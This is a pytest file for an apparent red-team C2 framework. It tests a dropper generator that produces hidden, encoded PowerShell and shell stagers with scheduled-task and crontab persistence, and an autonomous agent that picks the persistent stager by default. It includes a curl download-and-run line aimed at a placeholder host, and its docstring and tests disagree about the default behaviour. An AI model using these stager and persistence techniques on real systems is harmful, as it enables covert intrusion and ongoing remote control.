"""8.1 — the stager must survive a failed first download (option C).

One download attempt is a single point of failure: a captive portal, a
proxy hiccup or a filtered first hop and there is no beacon and no second
chance. The resilient stager keeps the one-shot behaviour as the FIRST
move and, on failure, schedules a retry that already carries the C2
endpoint — it does not depend on the operator, nor on the delivery channel
still being open.

The retry is persistence, so the artefact names are deterministic and the
default (non-resilient) path is untouched: nothing here changes a stager
the operator did not ask to be resilient.
"""
import base64
import re

import pytest

from phantom.utils.builder import (
    _RETRY_CACHE,
    _RETRY_MINUTES,
    _RETRY_SCRIPT,
    _RETRY_TASK_WIN,
    _ps_resilient,
    _sh_resilient,
    generate_dropper,
)

LHOST, LPORT = "10.10.10.5", 8443


class TestDefaultsAreResilient:
    """A delivery that only works when the C2 happens to be up is a one-shot
    gamble, so the DEFAULT stager retries on its own. Saying so explicitly is
    the point of this class — it used to pin the reverse."""

    @pytest.mark.parametrize("platform", ["windows", "linux", "macos",
                                          "android"])
    def test_the_default_stager_is_resilient(self, platform):
        cmd = generate_dropper(platform, LHOST, LPORT, use_ssl=True)
        assert cmd
        if platform == "windows":
            inner = base64.b64decode(
                cmd.rsplit("-Enc ", 1)[1]).decode("utf-16-le")
            assert _RETRY_TASK_WIN in inner
        else:
            script = base64.b64decode(cmd.split()[1]).decode()
            assert "crontab" in script

    @pytest.mark.parametrize("platform", ["windows", "linux", "macos",
                                          "android"])
    def test_the_one_shot_opt_out_is_plain(self, platform):
        plain = generate_dropper(platform, LHOST, LPORT, use_ssl=True,
                                 resilient=False)
        assert plain
        assert _RETRY_TASK_WIN not in plain
        assert "crontab" not in plain
        assert _RETRY_SCRIPT not in plain

    def test_an_unknown_platform_is_still_empty(self):
        assert generate_dropper("plan9", LHOST, LPORT) == ""
        assert generate_dropper("plan9", LHOST, LPORT, resilient=True) == ""
        assert generate_dropper("plan9", LHOST, LPORT, resilient=False) == ""


class TestWindowsResilience:
    def test_a_failure_schedules_the_retry_task(self):
        wrapped = _ps_resilient("Invoke-It")
        assert "try{Invoke-It}catch" in wrapped
        assert f"/tn '{_RETRY_TASK_WIN}'" in wrapped
        assert f"/mo {_RETRY_MINUTES}" in wrapped
        assert "/sc minute" in wrapped

    def test_the_retry_action_carries_the_same_stager(self):
        core = "Write-Output 'core-marker'"
        wrapped = _ps_resilient(core)
        action = re.search(r"/tr \"(.*?)\"\|Out-Null", wrapped).group(1)
        assert action.startswith("powershell -NoP -NonI -W Hidden -Exec Bypass")
        enc = action.rsplit("-Enc ", 1)[1]
        assert core in base64.b64decode(enc).decode("utf-16-le")

    def test_the_resilient_stager_is_one_runaway_free_command(self):
        cmd = generate_dropper("windows", LHOST, LPORT, use_ssl=True,
                               resilient=True)
        assert cmd.startswith("powershell -NoP -NonI -W Hidden -Exec Bypass")
        inner = base64.b64decode(cmd.rsplit("-Enc ", 1)[1]).decode("utf-16-le")
        assert _RETRY_TASK_WIN in inner
        # the endpoint is inside the retry, not only in the first attempt
        assert LHOST in base64.b64decode(
            re.search(r"-Enc (\S+)\"\|Out-Null", inner).group(1)
        ).decode("utf-16-le")


class TestPosixResilience:
    def test_the_wrapper_is_quoting_proof(self):
        """The payload's own single quotes must not break the wrapper."""
        cmd = "curl -sk 'http://h:1/x?auth=a' -o /tmp/.x && /tmp/.x h 1 0"
        wrapped = _sh_resilient(cmd)
        assert wrapped.startswith("echo ")
        assert wrapped.endswith("| base64 -d | sh")
        script = base64.b64decode(wrapped.split()[1]).decode()
        # the original command travels as base64, so its quotes survive
        assert cmd not in script            # not inlined verbatim
        assert cmd in base64.b64decode(script.split("printf %s ")[1]
                                       .split(" | base64 -d")[0]).decode()
        # and the wrapper writes the retry script byte-exactly: a format
        # escape in `printf` would land INSIDE the script
        assert "\\n" not in script.splitlines()[1]

    def test_the_retry_is_scheduled_only_after_a_failure(self):
        script = base64.b64decode(
            _sh_resilient("true").split()[1]).decode()
        assert f"if sh {_RETRY_SCRIPT}; then" in script
        assert "exit 0" in script.split(f"if sh {_RETRY_SCRIPT}; then")[1]
        assert "crontab" in script

    def test_the_retry_script_holds_the_endpoint(self):
        cmd = generate_dropper("linux", LHOST, LPORT, use_ssl=True,
                               resilient=True)
        script = base64.b64decode(cmd.split()[1]).decode()
        assert _RETRY_SCRIPT in script and _RETRY_CACHE in script
        assert f"*/{_RETRY_MINUTES}" in script
        inner = base64.b64decode(
            script.split("printf %s ")[1].split(" | base64 -d")[0]
        ).decode()
        assert f"{LHOST}:{LPORT}" in inner

    @pytest.mark.parametrize("platform", ["linux", "macos", "android"])
    def test_every_posix_platform_gets_a_retry(self, platform):
        cmd = generate_dropper(platform, LHOST, LPORT, use_ssl=True,
                               resilient=True)
        # android has no crontab everywhere: the first attempt still runs,
        # and the schedule is best-effort
        assert cmd.startswith("echo ") and cmd.endswith("| base64 -d | sh")
        script = base64.b64decode(cmd.split()[1]).decode()
        assert "crontab" in script

    def test_the_retry_leaves_a_greppable_artefact_for_cleanup(self):
        # the cleanup section has to find the retry: a random name would
        # leave persistence behind after the engagement closes
        assert _RETRY_SCRIPT.startswith("~/.cache/")
        assert _RETRY_TASK_WIN.isalnum()


class TestAgentPicksTheResilientStager:
    def _agent(self, **kw):
        from phantom.automation.agent import AutonomousAgent
        return AutonomousAgent(target="10.0.0.5", target_type="ip", **kw)

    def _build(self, agent):
        events = []
        agent._on_event = lambda k, d: events.append((k, d))
        agent._beacon_builder = lambda platform, host, port: "/tmp/beacon"
        agent._build_payload()
        return events

    def test_the_auto_mode_stager_is_resilient(self):
        events = self._build(self._agent())
        notes = [d for k, d in events if k == "note"]
        assert any("resilient" in n["detail"] for n in notes), notes

    def test_a_paranoid_run_keeps_the_resilient_stager(self):
        # paranoid is about OPSEC, not about losing the engagement to one
        # failed download: resilience is independent of it now
        events = self._build(self._agent(paranoid=True))
        notes = [d for k, d in events if k == "note"]
        assert any("resilient stager" in n["detail"] for n in notes), notes

    def test_the_no_resilient_run_is_one_shot(self):
        events = self._build(self._agent(resilient_stager=False))
        notes = [d for k, d in events if k == "note"]
        assert any("one-shot" in n["detail"] for n in notes), notes
        assert not any("resilient stager" in n["detail"] for n in notes)

    def test_the_cleanup_artefact_is_announced(self):
        events = self._build(self._agent())
        notes = [d for k, d in events if k == "note"]
        assert any("cleanup artefact" in n["detail"] for n in notes)
